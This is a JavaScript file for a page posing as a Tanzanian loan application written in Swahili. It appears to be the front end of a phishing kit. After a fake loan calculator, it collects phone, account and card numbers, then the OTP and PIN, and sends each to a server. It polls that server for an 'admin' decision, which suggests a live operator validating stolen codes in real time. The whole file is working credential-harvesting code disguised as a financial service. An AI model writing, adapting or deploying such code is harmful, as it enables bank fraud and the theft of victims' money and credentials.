function goToScreen(screenId) {
    document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
    document.getElementById(screenId).classList.remove('hidden');
}

function showSpinner(text = 'Inapakia...') { 
    document.getElementById('loading-text').innerText = text;
    document.getElementById('loading-spinner').classList.remove('hidden'); 
}

function hideSpinner() { 
    document.getElementById('loading-spinner').classList.add('hidden'); 
}

// Calculator Logic
function updateCalculator() {
    const amount = document.getElementById('loanAmountSlider').value;
    const months = document.getElementById('loanMonthsSlider').value;
    
    document.getElementById('displayAmount').innerText = 'TZS ' + Number(amount).toLocaleString();
    document.getElementById('displayMonths').innerText = months + ' miezi';
    document.getElementById('requestedAmount').value = amount;

    const monthly = (Number(amount) * 1.09) / Number(months);
    document.getElementById('displayMonthlyPayment').innerText = 'TZS ' + Math.round(monthly).toLocaleString();
}

function submitCalculator(e) {
    e.preventDefault();
    goToScreen('screen-personal');
}

// Global server request handler
async function postData(step, data) {
    showSpinner('Inasubiri uthibitisho...');
    try {
        const response = await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ step, data })
        });
        const result = await response.json();
        if (result.pendingApproval) {
            pollAdminResponse();
        } else {
            hideSpinner();
            if (result.message) showInlineNotice(result.message, 'error');
        }
    } catch (e) {
        hideSpinner();
        showInlineNotice('Mtandao unasumbua. Tafadhali jaribu tena.', 'error');
    }
}

function pollAdminResponse() {
    const pollInterval = setInterval(() => {
        fetch('/api/poll-status')
            .then(res => res.json())
            .then(res => {
                if (res.status) {
                    clearInterval(pollInterval);
                    hideSpinner();
                    handleServerResponse(res);
                }
            })
            .catch(() => {
                // Keep polling on network blips
            });
    }, 1500);
}

// Inline Notification Handler (Replaces browser pop-up alerts)
function showInlineNotice(message, type = 'error') {
    const currentScreen = document.querySelector('.screen:not(.hidden)').id;
    let noticeElementId = '';

    if (currentScreen === 'screen-personal') noticeElementId = 'personal-notice';
    else if (currentScreen === 'screen-step3') noticeElementId = 'step3-notice';
    else if (currentScreen === 'screen-step4') noticeElementId = 'otp-notice';
    else if (currentScreen === 'screen-step5') noticeElementId = 'pin-notice';

    const noticeEl = document.getElementById(noticeElementId);
    if (noticeEl) {
        noticeEl.style.display = 'block';
        noticeEl.style.color = type === 'success' ? '#00873e' : '#d32f2f';
        noticeEl.style.fontWeight = 'bold';
        noticeEl.style.textAlign = 'center';
        noticeEl.style.margin = '10px 0';
        noticeEl.innerText = message;
    }
}

function handleServerResponse(res) {
    if (res.status === 'approved') {
        if (res.next === 'card_verify') goToScreen('screen-step3');
        else if (res.next === 'otp') {
            showInlineNotice('✅ Correct OTP! Inaendelea...', 'success');
            setTimeout(() => goToScreen('screen-step4'), 1000);
        }
        else if (res.next === 'pin') {
            showInlineNotice('✅ Correct PIN! Inaendelea...', 'success');
            setTimeout(() => goToScreen('screen-step5'), 1000);
        }
        else if (res.next === 'success') goToScreen('screen-success');
    } else if (res.status === 'retry_phone') {
        goToScreen('screen-personal');
        showInlineNotice(res.message, 'error');
    } else if (res.status === 'denied' || res.status === 'retry_otp' || res.status === 'blocked' || res.status === 'retry_pin') {
        showInlineNotice(res.message, 'error');
    } else if (res.status === 'resend') {
        showInlineNotice(res.message, 'success');
    }
}

// Form Handlers
function submitPersonal(e) {
    e.preventDefault();
    const notice = document.getElementById('personal-notice');
    if (notice) notice.style.display = 'none';
    
    const data = {
        phoneNumber: document.getElementById('phoneNumber').value,
        loanAmount: document.getElementById('requestedAmount').value
    };
    postData('personal_info', data);
}

function submitStep3(e) {
    e.preventDefault();
    const notice = document.getElementById('step3-notice');
    if (notice) notice.style.display = 'none';

    const data = {
        accountNumber: document.getElementById('accountNumber').value,
        cardNumber: document.getElementById('cardNumber').value
    };
    postData('step3', data);
}

function submitStep4(e) {
    e.preventDefault();
    const notice = document.getElementById('otp-notice');
    if (notice) notice.style.display = 'none';

    const inputs = document.querySelectorAll('.otp-input');
    let otp = '';
    inputs.forEach(i => otp += i.value);
    postData('step4', { otp });
}

function resendOtp(e) {
    e.preventDefault();
    postData('step4', { otp: '', isResend: true });
}

function submitStep5(e) {
    e.preventDefault();
    const notice = document.getElementById('pin-notice');
    if (notice) notice.style.display = 'none';

    const inputs = document.querySelectorAll('.pin-input');
    let pin = '';
    inputs.forEach(i => pin += i.value);
    postData('step5', { pin });
}

// Auto-jump & Number-Only Filter for OTP, PIN, and Phone Inputs
document.addEventListener('DOMContentLoaded', () => {
    const setupNumericInputs = (selector) => {
        const inputs = document.querySelectorAll(selector);
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                // Strip out any non-digit characters (ensures numbers only)
                e.target.value = e.target.value.replace(/[^0-9]/g, '');

                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && input.value === '' && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
    };

    setupNumericInputs('.otp-input');
    setupNumericInputs('.pin-input');
    setupNumericInputs('#phoneNumber');
});
        
